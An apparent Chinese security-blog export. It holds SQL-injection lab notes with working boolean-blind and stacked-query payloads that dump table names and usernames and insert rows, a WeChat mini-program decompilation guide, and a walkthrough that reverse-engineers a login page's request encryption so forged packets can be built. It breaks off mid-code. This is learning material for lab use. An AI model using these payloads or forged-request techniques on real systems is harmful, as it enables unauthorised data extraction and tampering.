<h5 id="获取表名-3"><a href="#获取表名-3" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and (ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101 --+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到101时,返回正常界面,即第一个表名的第一个字符的ascii码值为101,即为e</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201153918305.png" alt="image-20221201153918305"></p>
<h5 id="获取列名-3"><a href="#获取列名-3" class="headerlink" title="获取列名"></a>获取列名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and ascii(substring((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=85 --+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到85时,返回正常界面,第一个列的列名第一个字符的ascii码值为85,即为U</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201160710682.png" alt="image-20221201160710682"></p>
<h5 id="获取列中的数据-3"><a href="#获取列中的数据-3" class="headerlink" title="获取列中的数据"></a>获取列中的数据</h5><p>获取到的列名为USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
<p>现在获取username中的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and ascii(substring((select username from users limit 0,1),1,1))=68 --+</span><br></pre></td></tr></table></figure>

<p>通过遍历数字,遍历到68时,返回正常界面,第一个列的列名第一个字符的ascii码值为68,即为D</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201160901890.png" alt="image-20221201160901890"></p>
<h3 id="2-3-5-堆叠查询"><a href="#2-3-5-堆叠查询" class="headerlink" title="2.3.5 堆叠查询"></a>2.3.5 堆叠查询</h3><h4 id="前置知识-4"><a href="#前置知识-4" class="headerlink" title="前置知识"></a>前置知识</h4><p>堆叠注入是指执行多条SQL语句,在MySQL中,每一条语句后加;表示语句结束,我们就可以多条语句一起执行,但是只有PHP使用<strong>mysqli_multi_query</strong>函数时,才能造成堆叠查询</p>
<p><strong>和联合查询的区别:</strong></p>
<p>联合查询可以执行的句子是有限的,堆叠查询可以执行任意语句,但是这种注入方式不是十分完美的,在web系统中,代码通常只返回一个查询结果,因此堆叠注入第二条语句产生的错误或结果只能被忽略,在前端是无法看到返回结果的,因此在读取数据时,建议使用联合查询,同时在使用堆叠注入之前,我们也是需要知道一些数据库信息的,例如表名、列名</p>
<h4 id="注入方法-4"><a href="#注入方法-4" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;insert into users(id,username,password) values (999,&#x27;test&#x27;,&#x27;test&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221203215145633.png" alt="image-20221203215145633"></p>
<p>此时查看id&#x3D;999,数据已经成功被添加</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221203215212251.png" alt="image-20221203215212251"></p>
<p>因为一般是看不到回显的,所以建议配合dnslog带出数据</p>
]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序反编译方法</title>
    <url>//blogs/wxapp_decompile/</url>
    <content><![CDATA[<h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h1><p>nodejs:<a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a></p>
<p>wxappUnpacker:<a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a></p>
<p>夜神模拟器6.6.1.1:<a href="https://support.yeshen.com/zh-CN/win-release">https://support.yeshen.com/zh-CN/win-release</a></p>
<p>微信8.0.24(32位):<a href="https://weixin.qq.com/cgi-bin/readtemplate?lang=zh_CN&amp;t=weixin_faq_list&amp;head=true">https://weixin.qq.com/cgi-bin/readtemplate?lang=zh_CN&amp;t=weixin_faq_list&amp;head=true</a></p>
<p>文件管理器</p>
<h1 id="2-反编译微信小程序"><a href="#2-反编译微信小程序" class="headerlink" title="2.反编译微信小程序"></a>2.反编译微信小程序</h1><h2 id="2-1-删除多余小程序包"><a href="#2-1-删除多余小程序包" class="headerlink" title="2.1 删除多余小程序包"></a>2.1 删除多余小程序包</h2><p>为了避免小程序包太多,先用文件管理器把小程序的包全部删除完</p>
<p>存放小程序包的路径为</p>
<p>&#x2F;data&#x2F;data&#x2F;com.tencent.mm&#x2F;MicroMsg&#x2F;{User哈希值}&#x2F;appbrand&#x2F;pkg</p>
<p>如果有多个user哈希值的目录,不清楚哪个是当前登录账号的目录,可以随便打开一个小程序,然后进入文件管理器按照时间排序,最近修改的文件夹基本上就是当前登录账号的文件夹了</p>
<p>将文件夹内的内容全部删除</p>
<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204161559427.png" alt="image-20221204161559427"></p>
<h2 id="2-2-获取小程序包"><a href="#2-2-获取小程序包" class="headerlink" title="2.2 获取小程序包"></a>2.2 获取小程序包</h2><p>手机进入小程序,会在对应目录生成几个包,包大致分为三种:基础包、主包、分包,基础包一般内存最大,主包其次,最小的是分包</p>
<p>用微信打开小程序,然后返回小程序包存放目录查看</p>
<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204162000740.png" alt="image-20221204162000740"></p>
<p>将包保存到电脑上,模拟器有文件传输助手,将文件移动到指定目录即可移动到电脑上</p>
<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204162126779.png" alt="image-20221204162126779"></p>
<h2 id="2-3-反编译小程序包"><a href="#2-3-反编译小程序包" class="headerlink" title="2.3 反编译小程序包"></a>2.3 反编译小程序包</h2><p>先反编译主包,进入wxappUnpacker目录,执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node wuWxapkg.js &quot;小程序包地址&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204162852271.png" alt="image-20221204162852271"></p>
<p>执行完成之后会在小程序包目录生成一个同名文件夹,里面就是小程序反编译后的源码</p>
<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204162951377.png" alt="image-20221204162951377"></p>
<p>然后反编译分包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node wuWxapkg.js &quot;小程序包地址&quot; -s=存放路径</span><br></pre></td></tr></table></figure>

<p>经过上面对主包和子包分别反编译之后会生成两个文件夹。</p>
<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204163822456.png" alt="image-20221204163822456"></p>
<h2 id="2-4-包合并"><a href="#2-4-包合并" class="headerlink" title="2.4 包合并"></a>2.4 包合并</h2><p>进入主包的文件夹,找到app.json-&gt;subPackages-&gt;root属性</p>
<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95/image-20221204164020516.png" alt="image-20221204164020516"></p>
<p>packageA即为定义的子包文件夹,将子包与该文件夹替换即可</p>
]]></content>
      <tags>
        <tag>微信小程序</tag>
        <tag>反编译</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次js加密算法逆向</title>
    <url>//blogs/js_decrypt/</url>
    <content><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>随着企业对安全越来越重视,前端加密也称为了企业防护的重要手段,以下过程仅记录学习过程</p>
<h1 id="2-过程"><a href="#2-过程" class="headerlink" title="2.过程"></a>2.过程</h1><h2 id="2-1-加密"><a href="#2-1-加密" class="headerlink" title="2.1 加密"></a>2.1 加密</h2><p>就拿登录功能为例,浏览器抓一下登录的包</p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122195844875.png" alt="image-20221122195844875"></p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122195913886.png" alt="image-20221122195913886"></p>
<p>请求包和返回包都经过了加密,要想继续渗透下去,就得找一下加解密的方法,才可以自己构造数据包</p>
<p>全局搜索<strong>secJson</strong></p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122200100713.png" alt="image-20221122200100713"></p>
<p>只有这一个js文件中存在,跟进去再搜一下<strong>secJson</strong></p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122202103879.png" alt="image-20221122202103879"></p>
<p>一共有三处,很明显可以得知t即为加密过后的参数,在可疑的地方加上断点重新请求</p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122202536553.png" alt="image-20221122202536553"></p>
<p>可以看到e为原始数据包的内容,原数据包的内容为</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;mobile&quot;</span><span class="punctuation">:</span><span class="string">&quot;18888888888&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;86e2rL/E5dA4KAJuLa3wPw==&quot;</span><span class="punctuation">,</span><span class="attr">&quot;zoneCode&quot;</span><span class="punctuation">:</span><span class="string">&quot;86&quot;</span><span class="punctuation">,</span><span class="attr">&quot;captchaId&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;verificationCode&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>密码也是加密的,我们先不管,主要是解密整个数据包,t为加密过后的数据包,看内容,数据包是经过了两次处理</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="title class_">Object</span>(y.<span class="property">b</span>)(e);</span><br><span class="line"><span class="keyword">return</span> t = <span class="title function_">u</span>(t = t.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>一次是由y.b处理,一次是由u处理,我们首先跟进y.b</p>
<p>找到y.b的内容,自己设置一个函数名,直接放js里面调试一下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt</span>(<span class="params">e</span>)&#123; 			<span class="comment">//e为原始数据包</span></span><br><span class="line">    <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , l = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , b = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="built_in">encodeURIComponent</span>(e), o = [], i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = t.<span class="title function_">charAt</span>(i);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;%&quot;</span> === r) &#123;</span><br><span class="line">                <span class="keyword">var</span> a = t.<span class="title function_">charAt</span>(i + <span class="number">1</span>) + t.<span class="title function_">charAt</span>(i + <span class="number">2</span>)</span><br><span class="line">                  , n = <span class="built_in">parseInt</span>(a, <span class="number">16</span>);</span><br><span class="line">                o.<span class="title function_">push</span>(n),</span><br><span class="line">                i += <span class="number">2</span></span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                o.<span class="title function_">push</span>(r.<span class="title function_">charCodeAt</span>(<span class="number">0</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> o.<span class="title function_">map</span>((<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(e)</span><br><span class="line">        &#125;</span><br><span class="line">        )).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;(e); c &lt; e.<span class="property">length</span>; )</span><br><span class="line">        o = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        i = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        a = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        n = o &gt;&gt; <span class="number">2</span>,</span><br><span class="line">        l = (<span class="number">3</span> &amp; o) &lt;&lt; <span class="number">4</span> | i &gt;&gt; <span class="number">4</span>,</span><br><span class="line">        b = (<span class="number">15</span> &amp; i) &lt;&lt; <span class="number">2</span> | a &gt;&gt; <span class="number">6</span>,</span><br><span class="line">        s = <span class="number">63</span> &amp; a,</span><br><span class="line">        <span class="built_in">isNaN</span>(i) ? b = s = <span class="number">64</span> : <span class="built_in">isNaN</span>(a) &amp;&amp; (s = <span class="number">64</span>),</span><br><span class="line">        t = t + r.<span class="title function_">charAt</span>(n) + r.<span class="title function_">charAt</span>(l) + r.<span class="title function_">charAt</span>(b) + r.<span class="title function_">charAt</span>(s);</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有错误就可以找下一个函数u,将内容复制到js里面调试一下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">u</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="string">&quot;&quot;</span></span><br><span class="line">      , r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">length</span> % <span class="number">2</span> ? (r = (e.<span class="property">length</span> + <span class="number">1</span>) / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">1</span>, r),</span><br><span class="line">    o = e.<span class="title function_">substring</span>(r),</span><br><span class="line">    i = e.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">1</span>) + o + t) : (r = e.<span class="property">length</span> / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">0</span>, r),</span><br><span class="line">    i = (o = e.<span class="title function_">substring</span>(r)) + t),</span><br><span class="line">    i</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们传入参数e,根据原来的处理方法处理,最后赋值给encryptResult,当只有这两个函数时,经调试会报出错误</p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122204449873.png" alt="image-20221122204449873"></p>
<p>r未定义,再从刚刚两个函数的位置上下翻一下r的值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br></pre></td></tr></table></figure>

<p>最后代码为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">encrypt</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , l = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , b = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="built_in">encodeURIComponent</span>(e), o = [], i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = t.<span class="title function_">charAt</span>(i);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;%&quot;</span> === r) &#123;</span><br><span class="line">                <span class="keyword">var</span> a = t.<span class="title function_">charAt</span>(i + <span class="number">1</span>) + t.<span class="title function_">charAt</span>(i + <span class="number">2</span>)</span><br><span class="line">                  , n = <span class="built_in">parseInt</span>(a, <span class="number">16</span>);</span><br><span class="line">                o.<span class="title function_">push</span>(n),</span><br><span class="line">                i += <span class="number">2</span></span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                o.<span class="title function_">push</span>(r.<span class="title function_">charCodeAt</span>(<span class="number">0</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> o.<span class="title function_">map</span>((<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(e)</span><br><span class="line">        &#125;</span><br><span class="line">        )).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;(e); c &lt; e.<span class="property">length</span>; )</span><br><span class="line">        o = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        i = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        a = e.<span class="title function_">charCodeAt</span>(c++),</span><br><span class="line">        n = o &gt;&gt; <span class="number">2</span>,</span><br><span class="line">        l = (<span class="number">3</span> &amp; o) &lt;&lt; <span class="number">4</span> | i &gt;&gt; <span class="number">4</span>,</span><br><span class="line">        b = (<span class="number">15</span> &amp; i) &lt;&lt; <span class="number">2</span> | a &gt;&gt; <span class="number">6</span>,</span><br><span class="line">        s = <span class="number">63</span> &amp; a,</span><br><span class="line">        <span class="built_in">isNaN</span>(i) ? b = s = <span class="number">64</span> : <span class="built_in">isNaN</span>(a) &amp;&amp; (s = <span class="number">64</span>),</span><br><span class="line">        t = t + r.<span class="title function_">charAt</span>(n) + r.<span class="title function_">charAt</span>(l) + r.<span class="title function_">charAt</span>(b) + r.<span class="title function_">charAt</span>(s);</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="string">&quot;&quot;</span></span><br><span class="line">      , r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">length</span> % <span class="number">2</span> ? (r = (e.<span class="property">length</span> + <span class="number">1</span>) / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">1</span>, r),</span><br><span class="line">    o = e.<span class="title function_">substring</span>(r),</span><br><span class="line">    i = e.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">1</span>) + o + t) : (r = e.<span class="property">length</span> / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">0</span>, r),</span><br><span class="line">    i = (o = e.<span class="title function_">substring</span>(r)) + t),</span><br><span class="line">    i</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e = <span class="string">&quot;&#123;\&quot;mobile\&quot;:\&quot;18888888888\&quot;,\&quot;password\&quot;:\&quot;86e2rL/E5dA4KAJuLa3wPw==\&quot;,\&quot;zoneCode\&quot;:\&quot;86\&quot;,\&quot;captchaId\&quot;:\&quot;\&quot;,\&quot;verificationCode\&quot;:\&quot;\&quot;&#125;&quot;</span></span><br><span class="line"><span class="keyword">var</span> t = <span class="title function_">encrypt</span>(e)</span><br><span class="line">t = <span class="title function_">u</span>(t = t.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(t)</span><br></pre></td></tr></table></figure>

<p>运行一下得到加密结果</p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122204914285.png" alt="image-20221122204914285"></p>
<p>和请求包中的数据一样,证明加密方法是正确的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secJson</span><br><span class="line">: </span><br><span class="line">&quot;zdQd3MhxUdKF0S0EEZ1U0LMJnMlZDOiojIkJ3b3N3chBnIsICO4gDO4gDO4gDOxIiOiUGbpJ2btJye==QfiIiOiUGZvNkbvlGdhNWamlmclZnIsIiI6ICZJFGajRHchNmIsIiN4IiOiUGZvNUZu9meiwiI90&quot;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-解密"><a href="#2-2-解密" class="headerlink" title="2.2 解密"></a>2.2 解密</h2><p>返回包也为加密的,先看一下返回包的特征,和请求包一样的格式,同样是找<strong>secJson</strong>,刚刚有三个,接下的的两个我们也找可疑的地方下断点,如果一眼看不出来可以多下断点,慢慢调</p>
<p><img src="/../images/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/image-20221122205538326.png" alt="image-20221122205538326"></p>
<p>e的值和返回包的值一样,基本可以确认这是解密返回包的代码,解密也是通过两次处理获得最后的数据</p>
<p>u处理一次,y.a处理一次,跟进两个函数复制出来,u我们之前已经有了,只复制一下y.a即可,给函数重命名之后放js里</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">decrypt</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , l = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , b = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = e.<span class="title function_">replace</span>(<span class="regexp">/[^A-Za-z0-9+/=]/g</span>, <span class="string">&quot;&quot;</span>); c &lt; e.<span class="property">length</span>; )</span><br><span class="line">        n = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        l = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        b = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        s = r.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(c++)),</span><br><span class="line">        o = n &lt;&lt; <span class="number">2</span> | l &gt;&gt; <span class="number">4</span>,</span><br><span class="line">        i = (<span class="number">15</span> &amp; l) &lt;&lt; <span class="number">4</span> | b &gt;&gt; <span class="number">2</span>,</span><br><span class="line">        a = (<span class="number">3</span> &amp; b) &lt;&lt; <span class="number">6</span> | s,</span><br><span class="line">        t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(o),</span><br><span class="line">        <span class="number">64</span> != b &amp;&amp; (t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)),</span><br><span class="line">        <span class="number">64</span> != s &amp;&amp; (t += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(a));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">map</span>((<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        )), o = <span class="string">&quot;&quot;</span>, i = <span class="number">0</span>; i &lt; t.<span class="property">length</span>; i++)</span><br><span class="line">            o += <span class="string">&quot;%&quot;</span> + t[i].<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(o)</span><br><span class="line">    &#125;(t)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入返回包执行一下,完整代码为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="string">&quot;&quot;</span></span><br><span class="line">      , r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">length</span> % <span class="number">2</span> ? (r = (e.<span class="property">length</span> + <span class="number">1</span>) / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">1</span>, r),</span><br><span class="line">    o = e.<span class="title function_">substring</span>(r),</span><br><span class="line">    i = e.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">1</span>) + o + t) : (r = e.<span class="property">length</span> / <span class="number">2</span>,</span><br><span class="line">    t = e.<span class="title function_">substring</span>(<span class="number">0</span>, r),</span><br><span class="line">    i = (o = e.<span class="title function_">substring</span>(r)) + t),</span><br><span class="line">    i</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decrypt</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="string">&quot;&quot;</span></span><br><span class="line">      , o = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , i = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , a = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , n = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , l = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , b = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , s = <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">      , c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (e = e.<span class="title function_">replace</span>(<span class="regexp">/[^A-Za-z0-9+/=]/g</span>, <span class="string">&quot;&quot;</span>); c &lt; e.<span class="property">length</span>; )</span><br><span class="line">        n = r.<span class="title 